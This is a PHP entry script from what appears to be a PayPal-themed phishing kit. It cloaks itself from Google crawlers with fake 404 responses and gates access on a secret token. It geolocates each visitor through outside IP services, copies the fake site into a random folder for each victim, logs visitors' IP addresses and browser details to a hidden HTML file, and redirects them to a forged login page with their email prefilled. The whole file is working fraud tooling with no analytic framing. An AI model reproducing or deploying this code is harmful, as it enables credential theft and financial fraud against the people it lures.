<?php
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();
include("include/antibot.php");
if($_GET['act_num'] =="confirm_account_3b2vhFa76bAq6"){
	if (!filter_var($_GET['email'], FILTER_VALIDATE_EMAIL) === false) {
		$_SESSION['_email_'] = $_GET['email'];
	}
	else if (!filter_var($_SESSION['_email_'], FILTER_VALIDATE_EMAIL) === true) {
		$_SESSION['_email_'] ="";
	}
// Detect Browser Language !
$lang_var = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);


switch ($lang_var){
    case "fr":
        $lang= "fr"; 
        break;
    case "it":
        $lang= "it";
        break;
    case "en":
        $lang= "en";
        break;        
    default:
        $lang= "en";
        break;
}
$_SESSION['_lang_'] = $lang;
#END

// GET Country & Country CODE !


    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $countrycode = $ip_data->geoplugin_countryCode;
        $_SESSION['cntcode'] = $countrycode;
    }

    else if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
        $_SESSION['cntname'] = $countryname;
    }
	else {
		
		$query = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
		if($query && $query['status'] == 'success') {
  		$_SESSION['cntname'] = $query['country'];
  		$_SESSION['cntcode'] = $query['countryCode'];  
			}
		}

$httpagent = getenv ("HTTP_USER_AGENT");
#END

// Create User FOLDER SCAM !
for ($DIR = '', $i = 0, $z = strlen($a = 'abcdefABCDEMN0123456789')-1; $i != 31; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
$_SESSION['_DIR_'] = $DIR;
$DIR = "./signin/".$DIR;
$vKAB="files";

function recurse_copy($vKAB,$DIR) {
$dir = opendir($vKAB);
@mkdir($DIR);
while(false !== ( $file = readdir($dir)) ) {
if (( $file != '.' ) && ( $file != '..' )) {
if ( is_dir($vKAB . '/' . $file) ) {
recurse_copy($vKAB . '/' . $file,$DIR . '/' . $file);
}
else {
copy($vKAB . '/' . $file,$DIR . '/' . $file);
}
}
}
closedir($dir);
}
$timmme = date('Y-m-d H:i:s');
recurse_copy( $vKAB, $DIR );
#END
$line = "<body style='background: #333;font-size: 11px;font-family: Monaco,Consolas,'Lucida Console',monospace;'><font color='#66BB0D'>vKab new Login:-</forn><br>
<font color='#FFEF00'>
<font color='#C90015'>[*] = </font><font color='#FFEF00'>".$timmme."</font>
<font color='#C90015'> |ip> </font>".$_SERVER[REMOTE_ADDR]."
<font color='#C90015'> |usr.agnt> </font>".$httpagent."
<font color='#C90015'> |chkr> </font><a style='color: #00E61B' target='_blank' href='https://ipinfo.io/".$_SERVER[REMOTE_ADDR]."'><font color='#800000'></font>Ipinfo</a> or <a style='color: #00E61B' target='_blank' href='http://www.geoiptool.com/?IP=".$_SERVER[REMOTE_ADDR]."'><font color='#800000'></font>Geo Ip Tool</a></font><hr></body>";
file_put_contents('vkab27.html', $line . PHP_EOL, FILE_APPEND);
//LOCATION !
header("location:".$DIR."/login.php?country.x=".$_SESSION['cntcode']."-".$_SESSION['cntname']."&lang.x=".$_SESSION['_lang_']."&email=".$_SESSION['_email_']."&confirmation_code=3b2hN76Aq6&act_num=confirm_account_3b2vhFa76bAq6&tmpl=profile%2Fmyaccount&aid=358301&new_account=1&import=1");
#END

}else {
header("location: https://www.youtube.com/user/PayPal");

}

?>